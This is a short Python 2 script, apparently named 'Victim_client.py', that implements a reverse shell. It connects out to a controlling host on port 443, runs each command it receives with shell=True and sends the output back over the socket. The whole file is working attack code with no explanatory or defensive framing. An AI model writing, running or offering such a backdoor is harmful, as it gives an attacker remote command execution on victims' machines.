#!/usr/bin/env python
import subprocess
import socket
import argparse


#----Usage-----
def usage():
	print "Victim_client.py -a 192.168.1.2 -p 999"
	exit(0)

def execute_command(cmd):
	cmd=cmd.rstrip()
	try:
		results=subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
	except Exception, e:
		results="Could not execute the command "+ cmd
	return results
	
def receive_data(client):
	try:
		received_cmd=""
		while True:
			received_cmd+=client.recv(4096)
			if not received_cmd:
				continue
			cmd_results=execute_command(received_cmd)
			client.send(cmd_results)
	except Exception, e:
		print e
		pass
def client_connect(host, port):
	client=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		client.connect((host,int(port)))
		print "connected with the server " +host + "at port number"+ str(port)
		receive_data(client)
	except Exception, e:
		print str(e)
		client.close()
			
def  main():
	#parser=argparse.ArgumentParser('victim client commander')
	#parser.add_argument('-a', '--address', type=str, help='The server Ip address')
	#parser.add_argument('-p', '--port', type=int, help='The server port number')
	#args=parser.parse_args()
	#if args.address==None:
		#usage()
	#target_host=args.address
	#port_number=args.port
	#client_connect(target_host, port_number)

	target_host='127.0.0.1'
	port_number='443'
	client_connect(target_host, port_number)





main(); 
